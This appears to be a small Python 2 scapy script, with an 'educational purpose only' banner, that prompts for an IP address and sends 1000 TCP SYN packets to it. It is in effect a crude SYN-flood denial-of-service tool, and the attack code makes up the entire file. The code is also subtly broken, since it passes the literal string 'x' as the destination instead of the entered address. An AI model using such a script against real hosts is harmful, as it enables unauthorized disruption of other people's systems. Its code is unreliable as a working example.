#!/bin/env python
import sys
import os

print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
print "Use this script for educational purpose only and proof-of-concepts"
print "    Make your own test lab or try where authorized to do so       "
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"


x = raw_input("Enter the IP address: ")

from scapy.all import *
seq = 0
for a in range(0, 1000):
	seq = seq + a
	sr(IP(dst="x")/TCP(flags = "S", seq = seq))
#a.show()
#sr(a)
######## END OF CODE #########
